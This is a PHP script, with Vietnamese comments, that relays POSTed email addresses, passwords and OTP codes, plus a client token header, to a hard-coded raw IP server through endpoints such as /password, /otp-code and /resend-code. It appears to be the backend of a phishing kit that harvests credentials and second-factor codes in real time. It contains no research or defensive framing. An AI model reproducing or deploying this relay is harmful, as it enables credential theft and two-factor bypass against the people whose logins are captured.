<?php


function senEvent($nodeAppUrl ,$jsonData) {
    $ch = curl_init($nodeAppUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

$LINK = "http://103.156.90.118:5000";
// $LINK = "http://localhost:5000";
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Nhận dữ liệu POST từ Ajax
    $type = $_POST["type"];
    $jsonData = json_encode($_POST);
    if($type == 'email') {
        $nodeAppUrl = $LINK . '/email';
        $ch = curl_init($nodeAppUrl);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
        $response = curl_exec($ch);
        curl_close($ch);
        echo json_encode($response);
    } else if($type == 'password') {
        $nodeAppUrl = $LINK . '/password';
        $ch = curl_init($nodeAppUrl);
        $header = $_SERVER['HTTP_X_CLIENT_TOKEN'];
        $headers = array(
            'Content-Type: application/json',
            'x-client-token: ' . $header // Thêm các header tùy chỉnh ở đây
            // 'x-client-token: ' . $header['x-client-token'] // Thêm các header tùy chỉnh ở đây
        );
        $headers['Content-Type'] = 'application/json';
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
        $response = curl_exec($ch);
        curl_close($ch);
        echo json_encode($response);
    } else if($type == 'otp') {
        $nodeAppUrl = $LINK . '/otp-code';
        $ch = curl_init($nodeAppUrl);
        $header = $_SERVER['HTTP_X_CLIENT_TOKEN'];
        $headers = array(
            'Content-Type: application/json',
            'x-client-token: ' . $header // Thêm các header tùy chỉnh ở đây
            // 'x-client-token: ' . $header['x-client-token']
        );
        $headers['Content-Type'] = 'application/json';
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
        $response = curl_exec($ch);
        curl_close($ch);
        echo json_encode($response);
    } else if($type == 'resend') {
        $nodeAppUrl = $LINK . '/resend-code';
        $ch = curl_init($nodeAppUrl);
        $header = $_SERVER['HTTP_X_CLIENT_TOKEN'];
        $headers = array(
            'Content-Type: application/json',
            'x-client-token: ' . $header // Thêm các header tùy chỉnh ở đây
            // 'x-client-token: ' . $header['x-client-token']
        );
        $headers['Content-Type'] = 'application/json';
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
        $response = curl_exec($ch);
        curl_close($ch);
        echo json_encode($response);
    } else if($type == 'cancel') {
        $nodeAppUrl = $LINK . '/cancel';
        $ch = curl_init($nodeAppUrl);
        $header = $_SERVER['HTTP_X_CLIENT_TOKEN'];
        $headers = array(
            'Content-Type: application/json',
            'x-client-token: ' . $header // Thêm các header tùy chỉnh ở đây
            // 'x-client-token: ' . $header['x-client-token'] // Thêm các header tùy chỉnh ở đây
        );
        $headers['Content-Type'] = 'application/json';
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
        $response = curl_exec($ch);
        curl_close($ch);
        echo json_encode($response);
    }
} else {
    // Trường hợp không phải POST request
    echo "Invalid request method.";
}

?>